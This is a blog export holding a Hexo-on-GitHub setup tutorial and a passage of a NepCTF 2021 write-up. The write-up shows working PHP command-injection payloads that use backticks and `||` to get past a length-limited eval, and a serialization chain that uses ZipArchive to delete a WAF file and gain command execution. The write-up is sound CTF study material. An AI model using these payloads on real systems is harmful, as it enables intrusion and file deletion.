<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>github+hexo搭建个人博客教程</title>
    <url>/2021/01/12/github+hexo%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="搭建步骤"><a href="#搭建步骤" class="headerlink" title="搭建步骤"></a>搭建步骤</h1><ul>
<li>环境搭建<ul>
<li>安装node.js</li>
<li>安装git</li>
<li>安装Hexo</li>
</ul>
</li>
<li>github仓库的创建</li>
<li>githubSSH的配置</li>
<li>sublime的安装使用</li>
<li>Hexo与github连接</li>
<li>Hexo的主题切换<a id="more"></a>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h2></li>
<li>安装node.js之前请先安装npm并了解相关知识</li>
</ul>
<p>Hexo基于node.js,所以我们需要现在计算机中安装<a href="https://nodejs.org/zh-cn/download/">node.js</a>.<br><img src="https://img-blog.csdnimg.cn/20210111144246737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">选择windows64位安装包下载，下载完后一路next就好啦。</p>
<p>检查node.js是否安装成功，win+r打开命令窗口，输入node -v<br><img src="https://img-blog.csdnimg.cn/20210112111604710.png" alt="node.js 检测"><br>出现版本号即安装成功</p>
<p>检查npm是否安装成功，在命令窗口下，输入npm -v<br><img src="https://img-blog.csdnimg.cn/20210112111804857.png" alt="npm 检测"><br>出现版本号即安装成功</p>
<p>好啦，到这里Hexo的环境已经搭建完毕了</p>
<h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><h3 id="1、git下载"><a href="#1、git下载" class="headerlink" title="1、git下载"></a>1、git下载</h3><p>git的下载可以去官网下载<a href="https://www.git-scm.com/download%EF%BC%8C%E4%BD%86%E6%98%AF%E4%BC%9A%E6%9C%89%E7%82%B9%E6%85%A2%E3%80%82">https://www.git-scm.com/download，但是会有点慢。</a><br>觉得慢的可以去这个网址下载链接：<a href="https://pan.baidu.com/s/1_nBfUmuRlilFQnVeoYALiw">https://pan.baidu.com/s/1_nBfUmuRlilFQnVeoYALiw</a> 提取码：qivu </p>
<h3 id="2、git安装"><a href="#2、git安装" class="headerlink" title="2、git安装"></a>2、git安装</h3><p>1、下载完后双击安装程序Git-2.30.0-64-bit，进入安装界面，点击next：<br><img src="https://img-blog.csdnimg.cn/2021011216423378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>2、选择安装目录：<br><img src="https://img-blog.csdnimg.cn/20210112164344294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3、安装配置窗口，包括git命令行、git图形界面等：<br><img src="https://img-blog.csdnimg.cn/20210112164432241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>4、选择开始菜单文件：<br><img src="https://img-blog.csdnimg.cn/20210112164543529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>5、选择git的默认编译器，推荐vim：<br><img src="https://img-blog.csdnimg.cn/20210112164710774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>6、选择仓库的初始名称，选默认就好了：<br><img src="https://img-blog.csdnimg.cn/20210112164917618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>7、选择可以用windows命令行操作，也可用git bash操作：<br><img src="https://img-blog.csdnimg.cn/20210112165043808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>8、HTTPS传输后台，用默认的就行了：<br><img src="https://img-blog.csdnimg.cn/20210112165228493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>9、选择换行符，默认unix格式，如果检测到windows格式则自动转换为unix格式：<br><img src="https://img-blog.csdnimg.cn/20210112165331786.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>10、选择配置默认终端：<br><img src="https://img-blog.csdnimg.cn/20210112165500295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>11、选择git pull风格，推荐默认：<br><img src="https://img-blog.csdnimg.cn/20210112165533960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>12、选择凭据管理，推荐默认选项：<br><img src="https://img-blog.csdnimg.cn/20210112165642464.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>13、配置额外的选项，选择文件缓存：<br><img src="https://img-blog.csdnimg.cn/20210112165731109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>14、这是新功能，不推荐选择：<br><img src="https://img-blog.csdnimg.cn/20210112165808234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>15、安装中：<br><img src="https://img-blog.csdnimg.cn/20210112165840223.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>16、安装成功辣：<br><img src="https://img-blog.csdnimg.cn/20210112165902939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>17、在任意文件夹中，右键即可选择<br>Git GUI为git图形界面工具<br>Git Bash为命令行工具<br><img src="https://img-blog.csdnimg.cn/20210112170126809.png"></p>
<h2 id="Hexo安装"><a href="#Hexo安装" class="headerlink" title="Hexo安装"></a>Hexo安装</h2><h3 id="Hexo安装-1"><a href="#Hexo安装-1" class="headerlink" title="Hexo安装"></a>Hexo安装</h3><p>hexo是我们以后用于搭建个人博客的框架，所以最好先新建一个blog文件夹用于博客的管理，且hexo框架与以后写作发布的网页都会保存在这个文件夹当中。<br>创建好之后，打开命令行，切换至创建的文件夹中：<br><img src="https://img-blog.csdnimg.cn/20210112171614641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>使用npm命令安装hexo，输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>
<p>耐心等待安装完成，安装完成之后，先初始化我们的博客，输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo init bolg</span><br></pre></td></tr></table></figure>
<p>tips：这些命令必须在我们创建的文件夹中使用。</p>
<p>此时我们检查一下我们网站的雏形，按顺序输入以下三条命令：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> hello Hexo		<span class="comment">//新建一篇名为“hello Hexo”的博客</span></span><br><span class="line">hexo g					<span class="comment">//生成静态文件</span></span><br><span class="line">hexo s					<span class="comment">//本地部署预览</span></span><br></pre></td></tr></table></figure>
<p>到这里我们的网站已经初步成型了，可以输入localhost:4000进行访问。</p>
<h3 id="Hexo的常用命令"><a href="#Hexo的常用命令" class="headerlink" title="Hexo的常用命令"></a>Hexo的常用命令</h3><h4 id="初始化命令"><a href="#初始化命令" class="headerlink" title="初始化命令"></a>初始化命令</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">npm install hexo -g	<span class="comment">//安装hexo</span></span><br><span class="line">npm update hexo -g	<span class="comment">//更新hexo</span></span><br><span class="line">hexo init	<span class="comment">//初始化博客</span></span><br></pre></td></tr></table></figure>
<h4 id="命令简写"><a href="#命令简写" class="headerlink" title="命令简写"></a>命令简写</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">hexo n <span class="string">&quot;博客名称&quot;</span> = hexo <span class="keyword">new</span> <span class="string">&quot;博客名称&quot;</span>	<span class="comment">//新建一篇博客</span></span><br><span class="line">hexo g = hexo generate	<span class="comment">//生成</span></span><br><span class="line">hexo s = hexo server	<span class="comment">//启动服务器</span></span><br><span class="line">hexo d = hexo deploy	<span class="comment">//部署</span></span><br></pre></td></tr></table></figure>
<h4 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">hexo server	<span class="comment">//hexo会监视文件变动并自动更新，无须重启服务器</span></span><br><span class="line">hexo server -s	<span class="comment">//静态模式</span></span><br><span class="line">hexo server -p <span class="number">5000</span>	<span class="comment">//更改端口</span></span><br><span class="line">hexo server -i <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>	<span class="comment">//自定义 IP地址</span></span><br><span class="line">hexo clean	<span class="comment">//清除缓存，若是网页正常情况下可以忽略这条命令</span></span><br></pre></td></tr></table></figure>
<h1 id="github仓库的创建"><a href="#github仓库的创建" class="headerlink" title="github仓库的创建"></a>github仓库的创建</h1><p>好了，到这里确保上方操作无误即可进行github仓库的创建(但首先你得先有个github账号哦)。<br>进入github主页，选择左上角的new：<br><img src="https://img-blog.csdnimg.cn/20210112173349599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>进入后输入仓库名称，必须要与owner下的名称一致，输入完后点击创建即可<br>我已经创建过仓库了，所以会提示<br><img src="https://img-blog.csdnimg.cn/20210112173512148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="githubSSH配置"><a href="#githubSSH配置" class="headerlink" title="githubSSH配置"></a>githubSSH配置</h1><p>搭建完仓库后就开始配置githubSSH。</p>
<p>进入git bash中，按顺序输入如下代码：</p>
<blockquote>
<p>git config –global user.email “<a href="mailto:&#x78;&#120;&#x78;&#64;&#113;&#x71;&#x2e;&#x63;&#x6f;&#109;">&#x78;&#120;&#x78;&#64;&#113;&#x71;&#x2e;&#x63;&#x6f;&#109;</a>“    //填写注册github的邮箱</p>
</blockquote>
<blockquote>
<p>git config –global user.name “xxxx”    //github 用户名</p>
</blockquote>
<blockquote>
<p>ssh-keygen    //输入完这个就一致enter就行了</p>
</blockquote>
<p>然后进入用户目录下的.ssh，打开id_rsa.pub，复制里面的内容。</p>
<p>进入github，新建一个SSH就可以了：</p>
<p><img src="https://img-blog.csdnimg.cn/20210112180408871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="sublime的安装使用"><a href="#sublime的安装使用" class="headerlink" title="sublime的安装使用"></a>sublime的安装使用</h1><p>sublime是一个好用的文本编辑器。</p>
<p>1、sublime下载<br>可以去官网下载：<a href="http://www.sublimetext.com/3">http://www.sublimetext.com/3</a><br>也可以云盘下载：<a href="https://pan.baidu.com/s/1hRvN9kMWXF56C_5YCVk_iw">https://pan.baidu.com/s/1hRvN9kMWXF56C_5YCVk_iw</a> 提取码：42pf </p>
<p>2、选择一个除C盘外的安装目录：<br><img src="https://img-blog.csdnimg.cn/20210112203141300.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3、然后点击next，安装完成：<br><img src="https://img-blog.csdnimg.cn/20210112203231376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>4、将博客目录拖入sublime：<br><img src="https://img-blog.csdnimg.cn/20210112210759495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Hexo与github连接"><a href="#Hexo与github连接" class="headerlink" title="Hexo与github连接"></a>Hexo与github连接</h1><p>1、在sublime中打开_config.yml，将Deployment改为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https:<span class="comment">//hexo.io/docs/one-command-deployment</span></span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:lucifer-rossweisse/lucifer-rossweisse.github.io.git	</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
<p>其中”repo”内填写github仓库中的SSH链接<br><img src="https://img-blog.csdnimg.cn/20210112211302998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>2、将”url”后改为”<a href="http://github项目名&quot;/">http://github项目名&quot;</a><br><img src="https://img-blog.csdnimg.cn/20210112211442895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3、在命令行中输入下列代码，安装插件，上传博客</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br><span class="line">git config --global user.email <span class="string">&quot;github邮箱&quot;</span></span><br><span class="line">git config --global user.name <span class="string">&quot;github用户名&quot;</span></span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
<p>4、在浏览器中输入博客网址，也是github仓库名，即可查看(有时候需要等一会)<br><img src="https://img-blog.csdnimg.cn/20210112211855757.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Hexo的主题切换"><a href="#Hexo的主题切换" class="headerlink" title="Hexo的主题切换"></a>Hexo的主题切换</h1><p>其实前面已经把重要的部分整完了，最后就换一个自己喜欢的主题就好了。</p>
<p>主题可以从github上搜hexo-them进行查找，比较受欢迎的是next和yilia这两个主题，以next为主，之后主题的切换都可以这么来。</p>
<p>1、进入博客文件夹，打开git bash，输入以下代码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>
<p>安装完后可以看到博客文件夹中的themes里出现了一个next文件夹，这就是我们下载的next主题。<br><img src="https://img-blog.csdnimg.cn/20210112212458400.png"><br>2、修改主题配置文件，进入博客文件夹中的_config.yml修改主题<br><img src="https://img-blog.csdnimg.cn/20210112212618350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3、然后先在本地测试一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210112212918907.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<p>4、最后直接上传发布博客就好了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
<p>注意：hexo在5.0之后把swig给删除了，需要自己手动安装，不然安装next主题后会显示错误<br>输入下面这串代码安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i hexo-renderer-swig</span><br></pre></td></tr></table></figure>
<p>然后hexo c清理缓存，hexo g &amp; s即可。</p>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>全部的搭建步骤已经讲完了，写篇博客其实只是为了记录一下自己学习的搭建过程，如果对你有帮助的话，可以分享给你的朋友哦(￣▽￣)”</p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>next</tag>
      </tags>
  </entry>
  <entry>
    <title>nep2021</title>
    <url>/2021/03/24/WriteUp/nep2021/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><a id="more"></a>
<p>对于本萌新来说，这次的nep比赛是非常好的一次历练机会（虽然web一道都没有写出来QAQ，但是之后复现后学到了很多新的姿势，相对来说还是有点提升的，嘿嘿。</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="little-trick"><a href="#little-trick" class="headerlink" title="little_trick"></a>little_trick</h3><p>打开题目后发现一串代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$nep</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;nep&#x27;</span>];</span><br><span class="line">    <span class="variable">$len</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;len&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$len</span>)&lt;<span class="number">8</span> &amp;&amp; strlen(<span class="variable">$nep</span>)&lt;<span class="number">13</span>)&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr(<span class="variable">$nep</span>,<span class="number">0</span>,<span class="variable">$len</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too long!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>算是第一次遇到trick题吧，找了找度娘知道可以利用<strong>php的反引号执行系统命令</strong> 的特性</p>
<h4 id="第一种解法"><a href="#第一种解法" class="headerlink" title="第一种解法"></a>第一种解法</h4><p>tips：这个解法需要开两次靶机，第一次查看文件目录，第二次cat</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url/?nep=`ls&gt;<span class="number">1</span>`&amp;len=<span class="number">7</span></span><br></pre></td></tr></table></figure>
<p>可以得到</p>
<p><img src="https://i.loli.net/2021/03/23/hSQWDe2IVbiFzGH.png"></p>
<p>然后再开一次靶机</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url/?nep=`&gt;cat`;&amp;len=<span class="number">7</span></span><br><span class="line">url/?nep=`*&gt;<span class="number">1</span>`;&amp;len=<span class="number">7</span></span><br><span class="line">在这里*&gt;<span class="number">1</span>相当于cat index.php nepctf.php&gt; <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>最后得到flag</p>
<blockquote>
<p>NepCTF{n3pn3p_l1ttle_tr1ck_c0me_bAck}</p>
</blockquote>
<h4 id="第二种解法"><a href="#第二种解法" class="headerlink" title="第二种解法"></a>第二种解法</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url/?nep=`<span class="variable">$len</span>`;&amp;len=<span class="number">7</span> || ls&gt;<span class="number">1</span></span><br><span class="line">url/?nep=`<span class="variable">$len</span>`;&amp;len=<span class="number">7</span> || cat nepctf.php&gt;<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>由于intval()函数的特性，会在遇到第一个非数字字符时停止截取，而nep参数中运用反引号``调用len参数</p>
<p>由于len=7 || cat nepctf.php&gt;1在linux中运行可知7不是一个命令，所以会执行||（或）之后的另一个命令</p>
<p>即</p>
<p><img src="https://i.loli.net/2021/03/23/itKIN7fSxoB8Ub6.png"></p>
<h3 id="梦里花开牡丹亭"><a href="#梦里花开牡丹亭" class="headerlink" title="梦里花开牡丹亭"></a>梦里花开牡丹亭</h3><p>进入题目后看见一串特长的代码，先来简单审计一下</p>
<p>首先是Game类，里面有<code>wakeup</code>和<code>destruct</code>方法，<code>wakeup</code>里还有一个<code>21232f297a57a5a743894a0e4a801fc3</code>在线解码后是<code>admin</code></p>
<p>简单分析了一下，咱可以知道应该是要调用Open类里的<code>shell($content);</code>来进行任意命令的执行，但是由于<code>waf.txt</code>的存在，咱只能调用file_get_contents()</p>
<p>先看看shell.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$register</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">&#x27;shell&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;register = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="keyword">new</span> Open();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Game();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
<p>发现挺多命令也被ban了</p>
<p><img src="https://i.loli.net/2021/03/23/RFHKUXqhJju12sN.png"></p>
<p>但这先放一边，先看看怎么删除掉<code>waf.txt</code>文件，不然连命令都输不进去_(:з」∠)_</p>
<p>之前的代码审计咱可以知道，login类中的checking方法里有个<code>$this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content);</code>这行代码</p>
<p>找找带有open()方法，而且还能删除文件的php原生类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = get_declared_classes();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>)&#123;</span><br><span class="line">    <span class="variable">$methods</span> = get_class_methods(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;open&#x27;</span></span><br><span class="line">        )))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$class</span>.<span class="string">&quot;::&quot;</span>.<span class="variable">$method</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单测试一下，发现ZipArchive()刚好可以把<code>waf.txt</code>删除</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$register</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">&#x27;waf.txt&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;register = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Game();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
<p>然后就可以随意命令执行辣</p>
<p>tips：很多查看命令被ban了，但是还可以使用<code>php /flag</code>绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$register</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span 